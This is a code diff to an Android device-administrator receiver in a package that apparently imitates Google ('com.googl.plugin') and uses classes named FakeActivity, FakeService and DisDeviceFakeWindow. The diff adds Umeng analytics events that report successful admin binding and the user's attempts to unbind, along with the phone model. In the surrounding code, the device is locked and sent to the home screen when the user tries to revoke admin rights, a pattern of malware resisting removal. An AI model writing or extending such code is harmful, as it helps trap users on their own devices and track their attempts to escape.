@@ -6,15 +6,19 @@ import android.app.admin.DeviceAdminReceiver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.os.Build;
 import android.view.WindowManager;
 import com.googl.plugin.x.FakeActivity;
 import com.plugin.common.utils.UtilsRuntime;
+import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.DisDeviceFakeWindow;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 import com.xstd.plugin.service.FakeService;
+
+import java.util.HashMap;
 
 /**
  * Created with IntelliJ IDEA.
@@ -35,6 +39,12 @@ public class DeviceBindBRC extends DeviceAdminReceiver {
         Config.LOGD("[[DeviceBindBRC::onEnabled]] action : " + intent.getAction());
         SettingManager.getInstance().init(context);
         SettingManager.getInstance().setKeyHasBindingDevices(true);
+
+        //notify umeng
+        HashMap<String, String> log = new HashMap<String, String>();
+        log.put("binding", "success");
+        log.put("phoneType", Build.MODEL);
+        CommonUtil.umengLog(context, "binding", log);
 
         Intent i = new Intent();
         i.setAction(FakeService.BIND_SUCCESS_ACTION);
@@ -61,6 +71,12 @@ public class DeviceBindBRC extends DeviceAdminReceiver {
         Config.LOGD("[[DeviceBindBRC::onDisableRequested]] action : " + intent.getAction());
 
         if (!Config.DEBUG) {
+            //notify umeng
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("action", "try_unbinding");
+            log.put("phoneType", Build.MODEL);
+            CommonUtil.umengLog(context, "unbing", log);
+
             getManager(context).lockNow();
             UtilsRuntime.goHome(context);
 
